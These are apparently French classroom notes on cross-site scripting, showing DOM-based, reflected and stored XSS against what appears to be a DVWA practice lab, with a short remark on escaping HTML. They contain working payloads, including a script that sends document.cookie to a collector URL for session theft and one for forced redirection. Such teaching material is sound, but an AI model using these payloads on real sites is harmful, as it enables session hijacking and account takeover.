# XSS 

Cross X (Croix) Site Scripting 

ce sont des injections de code qui utilisent javascript 

vous arrivez à ajouter du javascript qui va modifier le DOM 

https://8a34-109-190-31-225.ngrok-free.app/vulnerabilities/xss_d/?default=English


https://8a34-109-190-31-225.ngrok-free.app/vulnerabilities/xss_d/?default=bonjour


https://8a34-109-190-31-225.ngrok-free.app/vulnerabilities/xss_d/?default=<script>alert("virus")</script>


https://8a34-109-190-31-225.ngrok-free.app/vulnerabilities/xss_d/?default=<img src="http://......js" >


# reflected XSS 

formulaire vous allez saisir dedans le js suivant 

```html
<script>alert('virus')</script>
```

redirection inattendue

```html
<script>window.location='https://google.fr'</script>
```

vol de session (via le cookie de session)

```html
<script>window.location='http://localhost:1234?g='+document.cookie</script>
```

http://localhost:1234?g=1234567984561

# stored XSS

=> dans le cas suivant le javascript va être stockée en base de données
=> dans les autres cas, le javascript été uniquement exécuté lorsque la page s'ouvre 

=> article dans votre site 
=> en dessous vous pouvez mettre un commentaire 
    
changer le chiffre 10 du  maxlength => 100000000 


<form>
    <input type="text" class="form-control" required maxlength="10">    
</form>

=> échapper les balises html <h1>bonjour</h1> => &lt;h1&gt;bonjour&lt;/h1&gt;

a = "<h1>bonjour</h1>"

{{ a }} => &lt;h1&gt;bonjour&lt;/h1&gt;

<script>??????????????????????????????????</script>

<h1>bonjour